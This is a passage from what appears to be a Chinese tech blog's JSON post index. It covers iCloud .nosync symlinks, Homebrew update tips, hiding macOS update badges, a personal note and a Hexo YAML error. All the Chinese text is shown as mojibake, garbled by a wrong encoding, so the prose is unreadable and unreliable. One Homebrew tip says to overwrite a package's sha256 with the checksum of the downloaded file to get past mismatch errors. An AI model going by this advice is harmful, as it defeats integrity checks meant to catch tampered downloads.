6.0.6ç‰ˆæœ¬ï¼Œè€Œå…¶å†…çš„è™šæ‹Ÿå®¢æˆ·æœºçš„IPv6æ˜¯æ­£å¸¸çš„ï¼ŒåŒ…æ‹¬åæ¥çš„é«˜ç‰ˆæœ¬Fusionä¸‹çš„è™šæœºIPv6éƒ½å¥½ä½¿ã€‚æ‰€ä»¥å¾ˆæ˜æ˜¾ï¼Œåªæ˜¯WorkStationä¸Šè¿™ä¸ªbugä¾æ—§å­˜åœ¨ï¼‰ è‡³æ­¤ï¼Œæ”¾å¼ƒæŠ˜è…¾ï¼ŒOverã€‚(å¦‚ä½•æœ‰ç½‘å‹å‘ç°è§£å†³è¯¥é—®é¢˜çš„åŠæ³•ï¼Œä¸åèµæ•™å“ˆï¼Œè¯„è®ºåŒºæˆ–è€…åŠ æˆ‘å¾®ä¿¡ Chaos_John )","categories":[],"tags":[{"name":"Virtualization","slug":"Virtualization","permalink":"https://blog.chaosjohn.com/tags/Virtualization/"},{"name":"IPv6","slug":"IPv6","permalink":"https://blog.chaosjohn.com/tags/IPv6/"},{"name":"network","slug":"network","permalink":"https://blog.chaosjohn.com/tags/network/"},{"name":"VMware","slug":"VMware","permalink":"https://blog.chaosjohn.com/tags/VMware/"}]},{"title":"iCloudåŒæ­¥æ’é™¤æ–‡ä»¶/ç›®å½•","slug":"iCloud-Sync-Exclusion","date":"2020-11-27T06:49:16.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"iCloud-Sync-Exclusion.html","link":"","permalink":"https://blog.chaosjohn.com/iCloud-Sync-Exclusion.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ å‰è¨€è‹¹æœçš„iCloudæœåŠ¡ï¼Œæ˜¯ç¬”è€…ç¦»ä¸å¼€è‹¹æœç”Ÿæ€çš„ä¸€å¤§é‡è¦åŸå› ã€‚ ä½†æ˜¯è‹¹æœé¸¡è´¼çš„å¾ˆï¼Œå…è´¹ç”¨æˆ·5GBå­˜å‚¨ç©ºé—´è½»è½»æ¾æ¾å°±å­˜æ»¡äº†ï¼Œæ‰€ä»¥æ—©å¹´åˆšå‡ºä»˜è´¹å‡çº§å®¹é‡çš„æ—¶å€™ï¼Œæˆ‘å°±è´­ä¹°äº†æœ€ä½çš„ä»˜è´¹å®¹é‡ï¼Œ20GB/Â¥6/æœˆã€‚è™½ç„¶ä¸å¤šï¼Œä½†æ˜¯å¤‡ä»½iPhoneè®¾å¤‡ï¼ˆç‰¹åˆ«æ˜¯ç›¸å†Œï¼‰ï¼Œä¹Ÿæ˜¯å¤Ÿç”¨çš„ã€‚ä¸è¿‡åæ¥è‹¹æœè‰¯å¿ƒå‘ç°ï¼ŒåŠ é‡ä¸åŠ ä»·ï¼Œè‡ªåŠ¨ç»™å˜æ›´æˆäº†50GBã€‚ è‡ªä» OS X 10.10 Yosemite å¼€å§‹ï¼ŒiCloudå¼€å§‹å¯ä»¥ç”¨äºåœ¨macä¸Šè¿›è¡Œæ–‡ä»¶å­˜å‚¨ï¼Œåˆè‡ªä» iOS 11 å¼€å§‹ï¼ŒiCloud Driveè¢«é›†æˆåˆ°äº†iPhone/iPadä¸Šï¼Œä»»æ„è®¾å¤‡éƒ½å¯è®¿é—®å’Œç¼–è¾‘å­˜å‚¨åœ¨iCloudå†…çš„æ–‡ä»¶ï¼Œè‡³æ­¤ï¼Œæ–‡ä»¶è·¨è®¾å¤‡å…±äº«å’ŒåŒæ­¥ï¼Œå°±æˆäº†è‹¹æœç”Ÿæ€çš„ä¸€å¤§æ€æ‰‹é”ã€‚iCloudå‘å±•å†å² è¯·ç§»æ­¥ ç»´åŸºç™¾ç§‘ ä»¥è‡³äºå½“50GBä¹Ÿä¸å¤Ÿç”¨çš„æ—¶å€™ï¼Œæˆ‘æ¯«ä¸çº ç»“çš„å‡çº§åˆ°äº† 200GB/Â¥20/æœˆ çš„å¥—é¤ï¼ˆè¿˜æ”¯æŒå®¶åº­ç»„å…±äº«å®¹é‡ï¼‰ã€‚ iCloud å‚¨å­˜ç©ºé—´æ–¹æ¡ˆå’Œå®šä»· ç—›ç‚¹é—®é¢˜ä¸ºäº†æ–¹ä¾¿åœ¨å¤šå°macè®¾å¤‡ä¹‹é—´åˆ‡æ¢å´åˆä¿æŒå·¥ä½œçš„è¿è´¯ï¼ŒiCloud Driveè¿˜è¢«å¾ˆå¤šäººç”¨ä½œåŒæ­¥å·¥ç¨‹ç›®å½•ã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œå½“å‰ç«¯å·¥ç¨‹æ”¾åœ¨iCloudå†…ï¼Œå…‰ä¸€ä¸ª node_modules ç›®å½•ï¼Œå°±èƒ½å æ®ä½ å‡ ç™¾MBç”šè‡³ä¸ŠGBçš„ç©ºé—´ï¼Œä½•å…¶æµªè´¹ã€‚ è§£å†³åŠæ³•å°†ç±»ä¼¼ node_modules çš„ç›®å½•æ’é™¤åœ¨å¤–ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå…·å¤‡åŒæ­¥åŠŸèƒ½çš„å·¥å…·ï¼ˆæ¯”å¦‚Syncthingï¼‰éƒ½ä¼šæœ‰ æ’é™¤ç›®å½•/æ–‡ä»¶ çš„è®¾ç½®é¡¹ï¼Œä½†æ˜¯iCloudååæ²¡æœ‰ã€‚ç¤¾åŒºå†…å¾ˆå¤šç”¨æˆ·å‘è‹¹æœæäº†æ”¹è¿›æ„è§ï¼Œä½†æ˜¯è‹¹æœå®˜æ–¹å°±æ˜¯â€œä¸å¬ä¸å¬ï¼Œç‹å…«å¿µç»â€çš„æ€åº¦ã€‚ ä½†ä¹Ÿä¸èƒ½è¯´è‹¹æœæ²¡æœ‰æä¾›æ’é™¤æ–‡ä»¶/ç›®å½•çš„æ–¹æ¡ˆï¼Œåªä¸è¿‡æ–¹æ¡ˆæ¯”è¾ƒæ¶å¿ƒç½¢äº†ã€‚å¾ˆç®€å•ï¼Œåœ¨ç›®å½•/æ–‡ä»¶å¤¹å°¾éƒ¨åŠ ä¸Š .nosync åç¼€ï¼Œå°±ä¸ä¼šè¢«iCloudåŒæ­¥äº†ã€‚ å–µå–µå–µï¼Ÿï¼Ÿï¼Ÿéœ€è¦æˆ‘æ”¹æ–‡ä»¶åï¼Ÿï¼Ÿï¼Ÿè¿™å«ä»€ä¹ˆäº‹å•Šæ‘”ï¼ï¼ï¼ æ²¡è¾™ï¼Œè¿™ä¸ªæ—¶å€™åªèƒ½ç”¨â€œè½¯é“¾æ¥â€æ¥å®ç°äº†ï¼š mv node_modules node_module.nosync é‡å‘½åå°¾éƒ¨åŠ  .nosync ln -sf node_modules.nosync node_modulesï¼Œå°†é‡å‘½ååçš„ç›®å½•è½¯é“¾æ¥åˆ° node_modulesï¼Œè¿™æ · npm è¿˜èƒ½é€šè¿‡ node_modules ç›®å½•ç®¡ç†ç¬¬ä¸‰æ–¹åº“ å½“ç„¶ï¼Œä¹Ÿæœ‰å¼€æºå·¥å…·æ¥å¸®ä½ æ›´é«˜æ•ˆåœ°åšè¿™ä»¶äº‹ï¼Œç§»æ­¥HaoChuan9421/nosync-icloud æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"OS X & macOS","slug":"OS-X-macOS","permalink":"https://blog.chaosjohn.com/tags/OS-X-macOS/"},{"name":"iCloud","slug":"iCloud","permalink":"https://blog.chaosjohn.com/tags/iCloud/"}]},{"title":"Homebrewæ›´æ–°ç›¸å…³å°æŠ€å·§","slug":"Homebrew-upgrade","date":"2020-11-26T07:22:22.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"Homebrew-upgrade.html","link":"","permalink":"https://blog.chaosjohn.com/Homebrew-upgrade.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ å‰è¨€ç¬”è€…åœ¨å››å¹´å‰æ›¾å†™è¿‡ä¸€æ–‡HomeBrew â€“ OSXä¸‹çš„æœ€å¼ºè½¯ä»¶åŒ…ç®¡ç†å™¨ï¼Œç¯‡ä¸­è¯¦ç»†ä»‹ç»äº†HomeBrewä»¥åŠCaskçš„ä½¿ç”¨ã€‚ å¤šå¹´è¿‡å»äº†ï¼ŒHomebrewä¾æ—§éå¸¸æµè¡Œï¼Œä½†å†…åœ¨ä¹Ÿå‘ç”Ÿäº†å¾ˆå¤šå˜åŒ–ï¼Œæ¯”å¦‚CaskåŸå…ˆä½œä¸ºç¬¬ä¸‰æ–¹Tapçš„å­˜åœ¨ï¼Œç°å·²æ•´åˆåˆ°Homebrewå†…ï¼Œåœ¨æœªå®‰è£…Caskçš„ç¯å¢ƒé‡Œï¼Œæ‰§è¡Œ brew cask install $&#123;app&#125;ï¼ŒHomebrewåˆ™ä¼šè‡ªåŠ¨å®‰è£…Caskã€‚ åŒæ—¶ï¼Œåœ¨Homebrewçš„æ—¥å¸¸ä½¿ç”¨ä¸­ï¼Œç¬”è€…ä¹Ÿé‡åˆ°äº†å¾ˆå¤šé—®é¢˜ï¼Œæœ¬æ–‡å°±ç€é‡äºâ€œè¸©å‘â€å’Œâ€œå¡«å‘â€ã€‚ â€œè¿™äº›å¹´é‡åˆ°çš„å‘â€Homebrewè‡ªåŠ¨æ›´æ–°brew æä¾›äº† update å‘½ä»¤ï¼Œä½†æ˜¯ä½ æ‰§è¡Œ install æˆ– upgrade æ—¶ï¼Œéƒ½ä¼šå¼ºåˆ¶æ€§å…ˆ updateï¼Œæµªè´¹å®è´µçš„æ—¶é—´ã€‚ è§£å†³ï¼š brewå‘½ä»¤å‰åŠ ä¸Šå˜é‡HOMEBREW_NO_AUTO_UPDATE=1ï¼Œå˜ä¸º $ HOMEBREW_NO_AUTO_UPDATE=1 brew install â€¦ æˆ–ä½¿ç”¨aliasåˆ«åï¼Œåœ¨.bashrcæˆ–.zshrcä¸­æ–°å¢ä¸€è¡Œ alias brew=&quot;HOMEBREW_NO_AUTO_UPDATE=1 brew&quot; æˆ–å¯¼å‡ºç¯å¢ƒå˜é‡ï¼Œåœ¨.bashrcæˆ–.zshrcä¸­æ–°å¢ä¸€è¡Œ export HOMEBREW_NO_AUTO_UPDATE=1ï¼Œç¬”è€…æ¨èè¿™ç§æ–¹æ³• æˆ–è€…ä½¿ç”¨ Homebrew/aliasesï¼Œæ‰§è¡Œ brew alias install_no_autoupdate=&#39;!HOMEBREW_NO_AUTO_UPDATE=1 brew install&#39;ï¼ˆinstall_no_autoupdate åå­—ä»»æ„æ›´æ¢ï¼‰ï¼Œä»¥åè¦æ‰§è¡Œæ— é¢„æ›´æ–°çš„ brew install $&#123;formula&#125; æ“ä½œï¼Œéƒ½æ”¹ä¸º brew install_no_autoupdate $&#123;formula&#125; Cask å®‰è£…çš„åº”ç”¨ï¼Œå’Œ App Store å®‰è£…çš„åº”ç”¨ï¼Œéƒ½æ··åœ¨äº†ä¸€èµ·å› ä¸ºåŒæ–¹éƒ½æŠŠåº”ç”¨å®‰è£…åˆ°äº† /Applications ç›®å½•ä¸‹ï¼Œæ‰€ä»¥å¯¼è‡´ åˆ†ä¸æ¸…åº”ç”¨åˆ°åº•æ˜¯Caskå®‰è£…çš„ï¼Œè¿˜æ˜¯App Storeé‡Œå®‰è£…çš„ å¦‚æœCaskå’ŒApp Storeå®‰è£…åŒä¸€æ¬¾åº”ç”¨ï¼Œåˆ™åå®‰è£…æˆ–æ›´æ–°çš„åº”ç”¨ï¼Œå°±ä¼šè¦†ç›–æ‰å…ˆå‰å­˜åœ¨çš„ç‰ˆæœ¬ è§£å†³ï¼šexport HOMEBREW_CASK_OPTS=&quot;--appdir=~/Applications/_&quot;ï¼Œè¿™æ ·Caskä¼šè‡ªåŠ¨å°†åº”ç”¨éƒ½å®‰è£…åˆ°ç”¨æˆ·ç›®å½•ä¸‹çš„ Applications/_/ é‡Œã€‚ è¿™é‡Œæˆ‘æƒ³ä»‹ç»ä¸€ä¸‹æˆ‘åœ¨macä¸‹çš„åº”ç”¨ç®¡ç†ï¼Œä»…ä¾›å‚è€ƒï¼š App Storeå®‰è£…çš„åº”ç”¨ï¼Œéƒ½ä½äº /Applications/ ä¸‹ Caskå®‰è£…çš„åº”ç”¨ï¼Œéƒ½ä½äº ~/Applications/_/ ä¸‹ ç½‘ç»œä¸Šæœç½—æ¥çš„ç ´è§£åº”ç”¨ï¼Œéƒ½ä½äº ~/Applications/#/ ä¸‹ JetBrainså…¬å¸çš„IDEï¼Œéƒ½ç”¨ JetBrains Toolbox è¿›è¡Œå®‰è£…ç®¡ç†ï¼ˆå½“ç„¶Toolboxæœ¬èº«æ˜¯ç”¨Caskè¿›è¡Œå®‰è£…çš„ï¼‰ å…¶ä»–å¼€æº/å…è´¹çš„åº”ç”¨ï¼Œéƒ½ä½äº ~/Applications/ ä¸‹ Cask æ‰¹é‡æ›´æ–°åº”ç”¨åœ¨å‰æ–‡HomeBrew â€“ OSXä¸‹çš„æœ€å¼ºè½¯ä»¶åŒ…ç®¡ç†å™¨ä¸­ç¬”è€…æ›¾ç»™å‡ºè¿‡ä¸€è¡Œshellè„šæœ¬ç”¨æ¥æ‰¹é‡æ›´æ–°Caskçš„åº”ç”¨ï¼Œä½†æ˜¯è¿™ä¹ˆå¤šå¹´è¿‡å»äº†ï¼Œè¿™è¡Œè„šæœ¬ç¬”è€…ä¸å†æ¨èä½¿ç”¨ã€‚è§£å†³ï¼šbrew tap buo/cask-upgradeï¼Œé¡¹ç›®é“¾æ¥ï¼Œå®‰è£…å®Œä¹‹åï¼Œ æ‰§è¡Œ: brew cuï¼Œæ›´æ–°æ‰€æœ‰â€œå­˜åœ¨æ›´æ–°ç‰ˆæœ¬â€çš„åº”ç”¨ æ‰§è¡Œ: brew cu $&#123;app&#125;ï¼Œæ›´æ–°ç‰¹å®šapp é€‰é¡¹: -a, --allï¼ŒåŒ…å«æ ‡è®°äº† auto-update çš„åº”ç”¨ï¼›-f, --forceï¼ŒåŒ…å«å½“å‰ç‰ˆæœ¬å·ä¸º latest çš„åº”ç”¨ï¼›-y, --yesï¼Œå¯¹æ‰€æœ‰è¯¢é—®æ˜¯å¦ç¡®è®¤æ›´æ–°ï¼Œè‡ªåŠ¨åº”ç­” yes å› å›½å†…ç½‘ç»œç¯å¢ƒå¯¼è‡´brewé€Ÿåº¦æ…¢è¿™é‡Œçš„æ…¢åŒ…å«ä¸¤æ–¹é¢ï¼šbrew update æ…¢ &amp; brew install æ…¢ è§£å†³æ–¹æ¡ˆA: æ¢æºç­–ç•¥ brew update æ…¢ï¼Œå‚è€ƒæ¸…åé•œåƒæºæŒ‡å— brew install æ…¢ï¼Œå‚è€ƒæ¸…åé•œåƒæºæŒ‡å— è§£å†³æ–¹æ¡ˆB: ä»£ç†ç­–ç•¥, export all_proxy=socks5://$&#123;host&#125;:$&#123;port&#125;ï¼Œæ›¿æ¢è‡ªå·±ä»£ç†ä¸»æœºåœ°å€å’Œç«¯å£å³å¯ Error: SHA256 mismatch / Error: Checksum mismatchå‰è€…æ˜¯ brew åè€…æ˜¯ caskï¼Œé”™è¯¯åŸå› ï¼Œä»“åº“é‡Œè®°è½½çš„æ ¡éªŒå€¼å’Œå®é™…ä¸‹è½½ä¸‹è½½çš„æ–‡ä»¶æ ¡éªŒå€¼ä¸ä¸€è‡´ è§£å†³: æ‰§è¡Œ rm -rf ~/Library/Caches/Homebrew å°†æœ¬åœ°ç¼“å­˜ç›®å½•åˆ é™¤åé‡è¯•ï¼Œæœ‰æ¦‚ç‡èƒ½è§£å†³é—®é¢˜ï¼Œé€‚ç”¨äºè½¯ä»¶å‘è¡Œè€…ä¿®æ”¹åº”ç”¨åç¼ºæ²¡æœ‰æ›´æ”¹ç‰ˆæœ¬å·å°±å‘è¡Œå‡ºå»çš„æƒ…å†µã€‚è‹¥æœªè§£å†³ï¼Œé’ˆå¯¹äº brewï¼Œç¼–è¾‘ /usr/local/Homebrew/Library/Taps/homebrew/homebrew-core/Formula/$&#123;formula&#125;.rbï¼Œé’ˆå¯¹äº caskï¼Œç¼–è¾‘ /usr/local/Homebrew/Library/Taps/homebrew/homebrew-cask/Casks/$&#123;app&#125;.rbï¼Œå°† sha256ä¿®æ”¹ä¸ºå®é™…æ ¡éªŒå€¼ï¼Œä¿å­˜ï¼Œå†æ¬¡æ‰§è¡Œå…ˆå‰æ“ä½œï¼Œå¤§æ¦‚ç‡èƒ½æˆåŠŸã€‚åˆ‡è®°ä¸¤ç‚¹ä¸»æ„äº‹é¡¹ï¼š éœ€ç¦ç”¨brewçš„è‡ªåŠ¨æ›´æ–°ï¼Œå¦åˆ™å‰è„šåˆšæ”¹å®Œæ ¡éªŒå€¼ï¼Œåè„šè‡ªåŠ¨æ›´æ–°å°±æŠŠæ ¡éªŒå€¼æ”¹å›æ¥äº† æ›´æ”¹æ ¡éªŒå€¼åä¸è¦å…³é—­ç¼–è¾‘å™¨ï¼Œç­‰å®‰è£…/æ›´æ–°åº”ç”¨æˆåŠŸåï¼Œç«‹å³æ’¤é”€æ›´æ”¹ï¼Œå†å…³é—­ç¼–è¾‘å™¨ï¼Œå› ä¸ºbrewå’Œcaskçš„ä»“åº“æ˜¯ç”¨gitç®¡ç†çš„ï¼Œæ›´æ”¹ä»“åº“æ–‡ä»¶å¯¹åç»­çš„æ›´æ–°ä¼šé€ æˆå†²çªã€‚å¦‚æœå‘ç”Ÿå†²çªäº†ï¼Œä¹Ÿåˆ«æ‹…å¿ƒï¼Œåˆ°ä»“åº“æ ¹ç›®å½•æ‰§è¡Œ git reset --hardæ¢å¤åŸæ ·ã€‚brew çš„ä»“åº“ç›®å½•ä½äº /usr/local/Homebrew/Library/Taps/homebrew/homebrew-core/ï¼›cask çš„ä»“åº“ç›®å½•ä½äº /usr/local/Homebrew/Library/Taps/homebrew/homebrew-cask/ æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"OS X & macOS","slug":"OS-X-macOS","permalink":"https://blog.chaosjohn.com/tags/OS-X-macOS/"},{"name":"Software","slug":"Software","permalink":"https://blog.chaosjohn.com/tags/Software/"},{"name":"Homebrew","slug":"Homebrew","permalink":"https://blog.chaosjohn.com/tags/Homebrew/"}]},{"title":"ç¦ç”¨macOSæ›´æ–°æé†’è§’æ ‡","slug":"Disable-Update-Badge-of-macOS","date":"2020-11-26T01:23:06.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"Disable-Update-Badge-of-macOS.html","link":"","permalink":"https://blog.chaosjohn.com/Disable-Update-Badge-of-macOS.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ è¿‘æ—¥æ¥ï¼Œè‹¹æœç”µè„‘çš„æ“ä½œç³»ç»Ÿ macOS Catalina æ¥è¿‘äº†ç”Ÿå‘½å‘¨æœŸçš„å°¾å£°ï¼Œæ–°çš„æ“ä½œç³»ç»Ÿ Big Sur äº2020å¹´11æœˆ12æ—¥å·²ç»å‘å¸ƒï¼ˆå¾ˆæœ‰æ„æ€çš„æ˜¯æ­£å¼ç‰ˆçš„é¦–ä¸ªç‰ˆæœ¬å·ä¸º11.0.1ï¼Œè€Œ11.0.0å¹¶æœªå¯¹å¤–å‘å¸ƒï¼Œåªé¢„è£…åœ¨Apple M1çš„ä¸‰å°ARMæ–°æœºä¸Šï¼Œè¯¦è§ä¸‹å›¾ï¼Œæ¥æºäºç»´åŸºç™¾ç§‘ï¼‰ ç¬”è€…æ˜¯Macæ­»å¿ ç²‰ï¼Œè‡ª Mac OS X 10.7 Lion å¼€å§‹ç”¨ï¼Œç»å†è¿‡ç³»ç»Ÿå‡çº§è¿˜éœ€ä»˜è´¹è´­ä¹°çš„å¹´ä»£ï¼ˆè¿˜è®°å¾—å½“æ—¶æ˜¯èŠ±äº†128å…ƒå‡çº§åˆ°äº† OS X 10.8 Mountain Lion ï¼‰ï¼Œè·¨åˆ°å¼€å§‹å…è´¹çš„ OS X 10.9 Mavericks ï¼Œç›´è‡³åæ¥å¼€å§‹æŠ›å» OS X å‘½åçš„ macOS Sierra ï¼Œç„¶ååˆ° macOS High Sierra ï¼Œåªè¦é‡Šå‡ºç¬¬ä¸€ä¸ªç‰ˆæœ¬ï¼Œç¬”è€…å°±ä¼šæ›´æ–°å°é²œã€‚æ— å¥ˆï¼Œå¾ˆæ˜æ˜¾çš„æ„Ÿè§‰åˆ°è‹¹æœåœ¨è½¯ä»¶æ–¹é¢çš„â€œåšå·¥â€è¶Šæ¥è¶Šç³™äº†ï¼Œå°é²œç”¨æˆ·æ…¢æ…¢æ²¦ä¸ºäº†â€å®éªŒå°ç™½é¼ â€ä»¥åŠâ€bugåé¦ˆå™¨â€ï¼Œæ‰€ä»¥åæ¥çš„ macOS Majave å’Œ macOS Catalina ï¼Œæˆ‘æ”¾å¼ƒäº†å°é²œï¼Œéƒ½ç­‰åˆ°x.4ç‰ˆæœ¬é‡Šå‡ºæ‰å†³å®šæ›´æ–°ï¼Œæ‰å ªå ªæ„Ÿè§‰â€œå¯ä»¥ç”¨äº†â€ã€‚ macOS Big Sur è¿™ä¸åˆšå‡ºå°±è¢«äººç¬‘æˆ Bug Sur ï¼Œç¬”è€…æ¯…ç„¶å†³ç„¶ä¸æ›´å®ƒã€‚ å¯æ˜¯é—®é¢˜æ¥äº†ï¼Œå‡çº§æé†’å°çº¢ç‚¹çœŸæ˜¯é€¼æ­»æˆ‘äº†ï¼ï¼ï¼è¿˜ä¸æ˜¯ä¸€å¤„ï¼ ç³»ç»Ÿå·¦ä¸Šè§’è‹¹æœæ ‡ğŸï¼Œç‚¹å‡»ä¸‹æ‹‰èœå•ï¼Œåœ¨ ç³»ç»Ÿåå¥½è®¾ç½®(System Preferences) å¤„æé†’æœ‰æ›´æ–° å¦‚æœæŠŠ ç³»ç»Ÿåå¥½è®¾ç½® é”å®šåœ¨Dockæ çš„è¯ï¼Œå°çº¢ç‚¹+1 åœ¨ ç³»ç»Ÿåå¥½è®¾ç½® å†…çš„ è½¯ä»¶æ›´æ–°(Software Update) ä¸Šï¼Œå°çº¢ç‚¹+2 è§£å†³ç­–ç•¥- ç³»ç»Ÿç‰ˆæœ¬ å°äº 10.15.5 or ç­‰äº 10.15.6ï¼ˆæ˜¯çš„ï¼Œå°±æ˜¯è¿™ä¹ˆå¥‡æ€ªï¼Œè¯¥ç­–ç•¥åœ¨10.15.5ä¸­è¢«å¼ƒç”¨äº†ï¼Œä½†åœ¨10.15.6ä¸­åˆæ”¾å‡ºæ¥äº†ï¼Œä¹‹ååˆå»æ‰äº†ï¼Œå‚è€ƒï¼‰ å…³é—­ ç³»ç»Ÿåå¥½è®¾ç½® æ‰“å¼€ ç»ˆç«¯(Terminal) æ‰§è¡Œ sudo softwareupdate --ignore &quot;macOS Big Sur&quot;ã€‚å¦‚æœå¤„äº Mojave æƒ³é˜»æ­¢å‡çº§åˆ° Catalina, æŠŠå‘½ä»¤ä¸­çš„ Big Sur æ”¹æˆ Catalinaå³å¯ã€‚ ï¼ˆå¦‚æœæ”¹å˜ä¸»æ„æƒ³æ¥æ”¶æ›´æ–°äº†ï¼Œæ‰§è¡Œ sudo softwareupdate --reset-ignoredå³å¯æ¢å¤ï¼‰ - ç³»ç»Ÿç‰ˆæœ¬ ç­‰äº 10.15.5 or å¤§äº 10.15.6 æ‰§è¡Œ: defaults write com.apple.systempreferences AttentionPrefBundleIDs 0 &amp;&amp; killall Dockï¼Œå°çº¢ç‚¹å°±æ¶ˆå¤±äº†ï¼Œä¸å†æç¤ºå‡çº§äº† æ¢å¤: defaults write com.apple.systempreferences AttentionPrefBundleIDs 1 &amp;&amp; killall Dock æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"OS X & macOS","slug":"OS-X-macOS","permalink":"https://blog.chaosjohn.com/tags/OS-X-macOS/"},{"name":"Skills","slug":"Skills","permalink":"https://blog.chaosjohn.com/tags/Skills/"}]},{"title":"äº2020å¹´æœ«çš„å›å½’","slug":"Comeback-in-2020","date":"2020-11-25T07:07:01.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"Comeback-in-2020.html","link":"","permalink":"https://blog.chaosjohn.com/Comeback-in-2020.html","excerpt":"","text":"æ˜¯çš„ï¼Œæˆ‘å›æ¥äº†ã€‚ è·å†™ä¸Šä¸€ç¯‡æ–‡ç« å·²ç»è¿‡å»3å¹´å¤šäº†ï¼Œå¾ˆæ±—é¢œï¼Œè™½ç„¶æ–‡ç« æœ¬æ¥å°±ä¸å¤šã€‚ å»ºç«™ä¹‹åˆï¼Œæƒ³å¥½å¥½ç»è¥è¿™ä¸ªåšå®¢ï¼Œæ¯•ç«Ÿæˆ‘æ˜¯ä¸€ä¸ªéå¸¸ä¹äºåˆ†äº«çš„æŠ€æœ¯å®…ï¼Œæˆ‘æƒ³æŠŠæˆ‘å­¦ä¼šçš„ï¼Œæˆ‘è¸©å‘çš„ï¼Œæˆ‘åˆ›é€ çš„ï¼Œéƒ½é€šè¿‡è¿™ä¸ªåšå®¢å±•ç¤ºå‡ºæ¥ã€‚ è™½ç„¶æ‰¾å€Ÿå£å¾ˆä¸è€»ï¼Œä½†æˆ‘ä¸å¾—ä¸è§£é‡Šä¸€ä¸‹ï¼Œä¸ºå•¥æŒºå¥½çš„æŠ±è´Ÿå´è¢«æˆ‘è’åºŸäº†ä¸‰å¹´ä¹‹ä¹…ã€‚ æ¬¡è¦åŸå› ï¼šå·¥ä½œä¸å¾—å¿—ï¼ŒèŒåœºä¸ç§°å¿ƒ ä¸»è¦åŸå› ï¼šç”Ÿæ´»äº†æ— å¸Œæœ›ï¼Œå‰å¥³å‹æç©ºæˆ‘æ‰€æœ‰çš„ç²¾åŠ›ï¼Œå³ä½¿æŠŠæ‰€æœ‰çš„å¿ƒæ€éƒ½èŠ±ä¸Šï¼Œå¾—æ¥çš„æ˜¯æ— ä¼‘æ­¢çš„æŒ‘åˆºå’Œåµé—¹ã€‚å¤šæ¬¡åˆ†æ‰‹æ— æœ(æ‡‚çš„äººè‡ªç„¶æ‡‚)ï¼Œè®¤å‘½äº†ï¼Œå°±åƒä¸€çœ¼çœ‹åˆ°äº†äººç”Ÿçš„ç»ˆç‚¹ï¼Œå¯¹æ„Ÿæƒ…å’Œç”Ÿæ´»å®Œå…¨ä¸§å¤±ä¿¡å¿ƒï¼Œè¿›è€Œåœ¨è‡ªå·±çƒ­çˆ±çš„å·¥ä½œå’Œè¡Œä¸šä¸Šå¤±å»äº†å¥‹æ–—çš„åŠ¨åŠ›ã€‚ ä¸‡å¹¸çš„æ˜¯ï¼Œæˆ‘æœ€åç»ˆäºæ‘†è„±äº†å‰ä»»ï¼Œå¹¶ä¸”èµ°å‡ºäº†é˜´å½±ã€‚æ›´åŠ å¹¸è¿çš„æ˜¯ï¼ŒåŠå¹´å‰ï¼Œæˆ‘é‡åˆ°äº†æˆ‘çš„å°å¯çˆ±ï¼Œå¥¹çš„å‡ºç°ï¼Œç…§äº®äº†æˆ‘çš„å¤©ç©ºã€‚ æˆ‘æ»¡è¡€å¤æ´»äº†ï¼ï¼ï¼ æ‰€ä»¥ï¼Œæˆ‘å›æ¥äº†ï¼","categories":[],"tags":[]},{"title":"Hexo YAMLException: can not read a block mapping entry","slug":"Hexo-YAMLException-can-not-read-a-block-mapping-entry","date":"2017-10-09T07:28:03.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"Hexo-YAMLException-can-not-read-a-block-mapping-entry.html","link":"","permalink":"https://blog.chaosjohn.com/Hexo-YAMLException-can-not-read-a-block-mapping-entry.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ é—®é¢˜å¥½ä¹…æ²¡å†™åšå®¢ï¼Œåˆšåˆšå†™äº†ä¸€ç¯‡Nginxåå‘ä»£ç†è·å–çœŸå®å®¢æˆ·ç«¯IPï¼Œç„¶åæ‰§è¡Œhexo d -gæ˜¯æŠ¥äº†é”™ï¼šYAMLException: can not read a block mapping entry; a multiline key may not be an implicit key at line 4, column 1: æŸ¥é”™ å…ˆæ¥çœ‹çœ‹åˆšåˆšå†™çš„Markdownæ–‡ä»¶ å¾ˆæ˜æ˜¾ï¼Œç¬¬å››è¡Œåªæ˜¯ä¸€ä¸ªåˆ†éš”ç¬¦ï¼Œæ€ä¹ˆå¯èƒ½å‡ºé—®é¢˜ è°·æ­Œä¸€ä¸‹é”™è¯¯ï¼Œå‘ç°é—®é¢˜æ‰€åœ¨ï¼Œå…¶å®æ˜¯ç¬¬ä¸‰è¡Œçš„é”™è¯¯ï¼Œtags:åé¢æ²¡æœ‰è·Ÿç©ºæ 